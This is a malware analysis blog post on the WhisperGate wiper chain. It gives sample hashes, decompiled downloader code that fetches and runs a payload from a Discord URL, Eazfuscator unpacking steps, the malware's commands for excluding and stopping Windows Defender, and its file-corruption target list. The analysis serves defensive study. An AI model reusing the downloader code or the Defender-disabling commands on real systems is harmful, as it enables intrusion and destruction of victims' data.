<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">WhisperGate Malware</h1><p class="page-description">Analysis of the WhisperGate malware delivery chain</p><p class="post-meta post-meta-title"><time class="dt-published" datetime="2022-01-20T00:00:00-06:00" itemprop="datePublished">
        Jan 20, 2022
      </time>
       â€¢ <span class="read-time" title="Estimated read time">
    
    
      4 min read
    
</span></p>

    
      <p class="category-tags"><i class="fas fa-tags category-tags-icon"></i></i> 
      
        <a class="category-tags-link" href="/categories/#whispergate">whispergate</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#malware">malware</a>
        
      
      </p>
    

    
      
        <div class="pb-5 d-flex flex-justify-left">
            <div class="px-2">
                <a href="https://www.youtube.com/c/OALabs" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-YouTube-FF0000" alt="Join us on YouTube">
                </a>
            </div>
            <div class="px-2">
                <a href="https://www.twitch.tv/oalabslive" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/twitch/status/oalabslive?style=social" alt="Join us on Twitch">
                </a>
            </div>
            <div class="px-2">
                <a href="https://discord.gg/cw4U3WHvpn" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-Join Our Discord-blueviolet" alt="Join Discord">
                </a>
            </div>
            <div class="px-2">
                <a href="https://www.patreon.com/oalabs" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-OALABS Patreon-FF424D" alt="Support us on Patreon">
                </a>
            </div>
          <div class="px-2">

    <a href="https://github.com/OALabs/research/tree/master/_notebooks/2022-01-20-whisper_gate.ipynb" role="button" target="_blank">
<img class="notebook-badge-image" src="/assets/badges/github.svg" alt="View On GitHub">
    </a>
</div>

          
          
          
        </div>
      </header>

  <div class="post-content e-content" itemprop="articleBody">
    <ul id="toc" class="section-nav">
<li class="toc-entry toc-h2"><a href="#Overview">Overview </a></li>
<li class="toc-entry toc-h2"><a href="#Stage-2---Downloader">Stage 2 - Downloader </a>
<ul>
<li class="toc-entry toc-h3"><a href="#Functionality">Functionality </a></li>
<li class="toc-entry toc-h3"><a href="#Sample-Functions">Sample Functions </a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#Stage-3---File-Corruptor-(Injector)">Stage 3 - File Corruptor (Injector) </a>
<ul>
<li class="toc-entry toc-h3"><a href="#Analysis-and-Unpacking">Analysis and Unpacking </a></li>
<li class="toc-entry toc-h3"><a href="#Functionality">Functionality </a></li>
<li class="toc-entry toc-h3"><a href="#Helpful-Eazfuscator-Concepts">Helpful Eazfuscator Concepts </a>
<ul>
<li class="toc-entry toc-h4"><a href="#Create-EXE-From-Assembly-(Add-Entrypoint)">Create EXE From Assembly (Add Entrypoint) </a></li>
<li class="toc-entry toc-h4"><a href="#Add-Function-Call-Breakpoint-To-EazFusactor">Add Function Call Breakpoint To EazFusactor </a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#Stage-4---File-Corruptor-(Final)">Stage 4 - File Corruptor (Final) </a>
<ul>
<li class="toc-entry toc-h3"><a href="#Functionality">Functionality </a></li>
<li class="toc-entry toc-h3"><a href="#File-Extension-target-list">File Extension target list </a></li>
</ul>
</li>
</ul><!--
#################################################
### THIS FILE WAS AUTOGENERATED! DO NOT EDIT! ###
#################################################
# file to edit: _notebooks/2022-01-20-whisper_gate.ipynb
-->

<div class="container" id="notebook-container">
        
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Overview">
<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
</h2>
<p>Stage 1 - MBR Wiper: <code>a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92</code></p>
<p>Stage 2 - Downloader: <code>dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78</code></p>
<p>Stage 3 - File Corruptor (injector): <code>9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d</code></p>
<p>Stage 4 - Final (unpacked on stream): <code>34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907</code></p>
<p>All samples on available on <a href="https://malshare.com/search.php">Malshare</a>.</p>
<p><strong>References:</strong></p>
<ul>
<li><a href="https://elastic.github.io/security-research/malware/2022/01/01.operation-bleeding-bear/article/">Elastic Security Research - Operation Bleeding Bear</a></li>
<li><a href="https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3">S2W TALON - Analysis of Destructive Malware (WhisperGate) targeting Ukraine</a></li>
<li><a href="https://www.youtube.com/watch?v=2nd-f1dIfD4">Stage 1 - Analysis From Hexorcist (YouTube)</a></li>
</ul>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Stage-2---Downloader">
<a class="anchor" href="#Stage-2---Downloader" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 2 - Downloader<a class="anchor-link" href="#Stage-2---Downloader"> </a>
</h2>
<p>This is a .NET binary that is obfuscated with <strong>NetReactor</strong>. We can use <a href="https://github.com/SychicBoy/NetReactorSlayer">NetReactorSlayer</a> to remove the obfuscation. Just drag the binary over and <code>yes</code> to all options.</p>
<p><strong>TODO:</strong> Find a way to identify NetReactor obfuscation -- is there a signature for it? 
<a href="https://github.com/NotPrab/.NET-Deobfuscator">List of .NET de-obfuscation tools</a></p>
<h3 id="Functionality">
<a class="anchor" href="#Functionality" aria-hidden="true"><span class="octicon octicon-link"></span></a>Functionality<a class="anchor-link" href="#Functionality"> </a>
</h3>
<ul>
<li>Download <strong>Stage3</strong> binary from Discord </li>
<li>Binary is downloaded as <code>Tbopbh.jpg</code> and is reversed</li>
<li>Reverse binary and load it directly as a .NET assembly </li>
<li>Call <code>Ylfwdwgmpilzyaph</code> method from loaded <strong>Stage3</strong> .NET assembly </li>
</ul>
<h3 id="Sample-Functions">
<a class="anchor" href="#Sample-Functions" aria-hidden="true"><span class="octicon octicon-link"></span></a>Sample Functions<a class="anchor-link" href="#Sample-Functions"> </a>
</h3>
<div class="highlight"><pre><span></span><span class="k">private</span> <span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="nf">ChangeFacade</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="n">Facade</span><span class="p">.</span><span class="n">ReflectFacade</span><span class="p">();</span>
        <span class="k">try</span>
        <span class="p">{</span>
            <span class="n">ServicePointManager</span><span class="p">.</span><span class="n">SecurityProtocol</span> <span class="p">=</span> <span class="n">SecurityProtocolType</span><span class="p">.</span><span class="n">Tls12</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">catch</span>
        <span class="p">{</span>
        <span class="p">}</span>
        <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span><span class="k">typeof</span><span class="p">(</span><span class="n">WebClient</span><span class="p">).</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">"DxownxloxadDxatxxax"</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s">"x"</span><span class="p">,</span> <span class="s">""</span><span class="p">),</span> <span class="k">new</span> <span class="n">Type</span><span class="p">[]</span>
        <span class="p">{</span>
            <span class="k">typeof</span><span class="p">(</span><span class="kt">string</span><span class="p">)</span>
        <span class="p">}).</span><span class="n">Invoke</span><span class="p">(</span><span class="k">new</span> <span class="n">WebClient</span><span class="p">(),</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[]</span>
        <span class="p">{</span>
            <span class="s">"https://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg"</span>
        <span class="p">});</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">array</span><span class="p">.</span><span class="n">Length</span> <span class="p">&gt;</span> <span class="m">1</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Array</span><span class="p">.</span><span class="n">Reverse</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">array</span><span class="p">;</span>
    <span class="p">}</span>

<span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">FillFacade</span><span class="p">(</span><span class="n">MethodInfo</span><span class="p">[]</span> <span class="n">spec</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="n">MethodInfo</span> <span class="n">methodInfo</span> <span class="k">in</span> <span class="n">spec</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">methodInfo</span><span class="p">.</span><span class="n">Name</span> <span class="p">==</span> <span class="s">"Ylfwdwgmpilzyaph"</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">methodInfo</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
</pre></div>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Stage-3---File-Corruptor-(Injector)">
<a class="anchor" href="#Stage-3---File-Corruptor-(Injector)" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 3 - File Corruptor (Injector)<a class="anchor-link" href="#Stage-3---File-Corruptor-(Injector)"> </a>
</h2>
<p>This is a .NET binary that appears to be obfuscated with <strong>Eazfuscator</strong> and we know from <strong>Stage2</strong> that it is loaded as a .NET assembly and the method <code>Ylfwdwgmpilzyaph</code> is where the code starts. Because it is loaded as an assembly it doesn't have an entrypoint and cannot be launched directly like a regular PE file.</p>
<p>For <strong>Eazfuscator</strong> we can try some tools like de4dot and <a href="https://github.com/HoLLy-HaCKeR/EazFixer">EazFizer</a> but they all fail because Eazfuscator has actually <strong>virtualized</strong> the functions. We need to do this dynamically.</p>
<h3 id="Analysis-and-Unpacking">
<a class="anchor" href="#Analysis-and-Unpacking" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis and Unpacking<a class="anchor-link" href="#Analysis-and-Unpacking"> </a>
</h3>
<ul>
<li>Open module in dnspy</li>
<li>Right click assembly <code>Edit Module...</code>
</li>
<li>Change Module Type to <code>Windows</code> and add <code>Ylfwdwgmpilzyaph</code> as the Managed Entry Point.</li>
<li>File -&gt; Save Module</li>
<li>Open saved module in dnspy</li>
<li>Locate call to EazFusactor vm in entrypoint<div class="highlight"><pre><span></span><span class="err">\</span><span class="n">u0005</span><span class="err">\</span><span class="n">u2005</span><span class="err">\</span><span class="n">u2000</span><span class="p">.</span><span class="err">\</span><span class="n">u000E</span><span class="err">\</span><span class="n">u2005</span><span class="err">\</span><span class="n">u2000</span><span class="p">().</span><span class="err">\</span><span class="n">u0002</span><span class="p">(</span><span class="err">\</span><span class="n">u0005</span><span class="err">\</span><span class="n">u2005</span><span class="err">\</span><span class="n">u2000</span><span class="p">.</span><span class="err">\</span><span class="n">u000F</span><span class="err">\</span><span class="n">u2005</span><span class="err">\</span><span class="n">u2000</span><span class="p">(),</span> <span class="s">"#6k@H!uq=A"</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
</pre></div>
</li>
<li>Press ctrl+f to open find and search for <code>.invoke</code>
</li>
<li>When you find the function with the two invokes on the entrypoint "call" put a breakpoint on them.<div class="highlight"><pre><span></span><span class="k">return</span> <span class="err">\</span><span class="n">u0002</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="err">\</span><span class="n">u0003</span><span class="p">,</span> <span class="err">\</span><span class="n">u0005</span><span class="p">);</span>
<span class="k">return</span> <span class="p">((</span><span class="n">ConstructorInfo</span><span class="p">)</span><span class="err">\</span><span class="n">u0002</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Public</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="err">\</span><span class="n">u0005</span><span class="p">,</span> <span class="k">null</span><span class="p">)</span>
</pre></div>
</li>
<li>Start debugger</li>
</ul>
<p>The concept behind this method is that Eazfuscator uses the <code>invoke</code> each time it calls into a virtualized function. By putting a breakpoint here we can monitor and intercept the arguments for each call. Each time we break we can inspect the arguments then run until we break again at the next call.</p>
<h3 id="Functionality">
<a class="anchor" href="#Functionality" aria-hidden="true"><span class="octicon octicon-link"></span></a>Functionality<a class="anchor-link" href="#Functionality"> </a>
</h3>
<ul>
<li>The sample checks if it is running as admin, if it isn't it will launch itself again elevated and teminate. </li>
<li>The sample drops a VBS script <code>%TEMP%\Nmddfrqqrbyjeygggda.vbs</code> that attempts to exclude <code>C:\</code> from Windows Defender <div class="highlight"><pre><span></span><span class="n">CreateObject</span><span class="p">(</span><span class="s">""</span><span class="n">WScript</span><span class="p">.</span><span class="n">Shell</span><span class="s">""</span><span class="p">).</span><span class="n">Run</span> <span class="s">""</span><span class="n">powershell</span> <span class="k">Set</span><span class="o">-</span><span class="n">MpPreference</span> <span class="o">-</span><span class="n">ExclusionPath</span> <span class="c">'C:\'"", 0, False</span>
</pre></div>
</li>
<li>Drops <code>AdvancedRun.exe</code> in <code>%TEMP%</code>  (SHA256: <code>29ae7b30ed8394c509c561f6117ea671ec412da50d435099756bbb257fafb10b</code>)</li>
<li>Attempts to stop Windows Defender <div class="highlight"><pre><span></span>/EXEFilename C:\Windows\System32\sc.exe /WindowState 0 /CommandLine <span class="s2">""</span>stop WinDefend<span class="s2">""</span>  /StartDirectory <span class="s2">""""</span> /RunAs 8 /Run
/EXEFilename C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /WindowState 0 /CommandLine <span class="s2">""</span>rmdir 'C:\ProgramData\Microsoft\Windows Defender' -Recurse<span class="s2">""</span> /StartDirectory <span class="s2">""""</span> /RunAs 8 /Run
</pre></div>
</li>
<li>Copy <code>InstallUtil.exe</code> into <code>%TEMP%</code> and launch it</li>
<li>Unpack <strong>Stage4</strong> which is reversed and gzipped</li>
<li>Inject <strong>Stage4</strong> into <code>InstallUtil.exe</code>
</li>
</ul>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Helpful-Eazfuscator-Concepts">
<a class="anchor" href="#Helpful-Eazfuscator-Concepts" aria-hidden="true"><span class="octicon octicon-link"></span></a>Helpful Eazfuscator Concepts<a class="anchor-link" href="#Helpful-Eazfuscator-Concepts"> </a>
</h3>
<h4 id="Create-EXE-From-Assembly-(Add-Entrypoint)">
<a class="anchor" href="#Create-EXE-From-Assembly-(Add-Entrypoint)" aria-hidden="true"><span class="octicon octicon-link"></span></a>Create EXE From Assembly (Add Entrypoint)<a class="anchor-link" href="#Create-EXE-From-Assembly-(Add-Entrypoint)"> </a>
</h4>
<p>
</p>
<center class="youtube-iframe-wrapper">
    <iframe width="730" height="315" src="https://www.youtube.com/embed/gW8CsLe0mlw" frameborder="0" allowfullscreen=""></iframe>
</center>


</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h4 id="Add-Function-Call-Breakpoint-To-EazFusactor">
<a class="anchor" href="#Add-Function-Call-Breakpoint-To-EazFusactor" aria-hidden="true"><span class="octicon octicon-link"></span></a>Add Function Call Breakpoint To EazFusactor<a class="anchor-link" href="#Add-Function-Call-Breakpoint-To-EazFusactor"> </a>
</h4>
<p>
</p>
<center class="youtube-iframe-wrapper">
    <iframe width="730" height="315" src="https://www.youtube.com/embed/pSHjUaWKuP4" frameborder="0" allowfullscreen=""></iframe>
</center>


</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Stage-4---File-Corruptor-(Final)">
<a class="anchor" href="#Stage-4---File-Corruptor-(Final)" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 4 - File Corruptor (Final)<a class="anchor-link" href="#Stage-4---File-Corruptor-(Final)"> </a>
</h2>
<p>This is a 32bit native Windows binary that has been compiled with MinGW.</p>
<h3 id="Functionality">
<a class="anchor" href="#Functionality" aria-hidden="true"><span class="octicon octicon-link"></span></a>Functionality<a class="anchor-link" href="#Functionality"> </a>
</h3>
<ul>
<li>Use <code>GetLogicalDrives</code> and interate through drives selecting FIXED and REMOTE drives</li>
<li>Recursively iterate through files in all directories except for <code>%HOMEDRIVE%\Windows</code>
</li>
<li>Compare the file extension against a list of target file extensions </li>
<li>For matching files replace the file contents with 0x100000 byes of <code>\xcc</code>
</li>
<li>Append a random hex integer to the corrupted file name </li>
</ul>
<h3 id="File-Extension-target-list">
<a class="anchor" href="#File-Extension-target-list" aria-hidden="true"><span class="octicon octicon-link"></span></a>File Extension target list<a class="anchor-link" href="#File-Extension-target-list"> </a>
</h3>
<pre><code>cmd
.HTML .HTM .SHTML .XHTML .PHTML .PHP .JSP .ASP .PHPS .PHP5 .ASPX .PHP4 .PHP6 .PHP7 .PHP3 .DOC .DOCX .XLS .XLSX .PPT .PPTX .PST .OST .MSG .EML .VSD .VSDX .TXT .CSV .RTF .WKS .WK1 .PDF .DWG .ONETOC2 .SNT .JPEG .JPG .DOCB .DOCM .DOT .DOTM .DOTX .XLSM .XLSB .XLW .XLT .XLM .XLC .XLTX .XLTM .PPTM .POT .PPS .PPSM .PPSX .PPAM .POTX .POTM .EDB .HWP .602 .SXI .STI .SLDX .SLDM .BMP .PNG .GIF .RAW .CGM .SLN .TIF .TIFF .NEF .PSD .AI .SVG .DJVU.SH .CLASS .JAR .BRD .SCH .DCH .DIP .PL .VB .VBS .PS1 .BAT .CMD .JS .ASM .H .PAS .CPP .C .CS .SUO .ASC .LAY6 .LAY .MML .SXM .OTG .ODG .UOP .STD .SXD .OTP .ODP .WB2 .SLK .DIF .STC .SXC .OTS .ODS .3DM .MAX .3DS .UOT .STW .SXW .OTT .ODT .PEM .P12 .CSR .CRT .KEY .PFX .DER .OGG .RB .GO .JAVA .INC .WAR .PY .KDBX .INI .YML .PPK .LOG .VDI .VMDK .VHD .HDD .NVRAM .VMSD .VMSN .VMSS .VMTM .VMX .VMXF .VSWP .VMTX .VMEM .MDF .IBD .MYI .MYD .FRM .SAV .ODB .DBF .DB .MDB .ACCDB .SQL .SQLITEDB .SQLITE3 .LDF .SQ3 .ARC .PAQ .BZ2 .TBK .BAK .TAR .TGZ .GZ .7Z .RAR .ZIP .BACKUP .ISO .VCD .BZ .CONFIG</code></pre>

</div>
</div>
</div>
</div>



  </div><a class="u-url" href="/whispergate/malware/2022/01/20/whisper_gate.html" hidden></a>
</article>
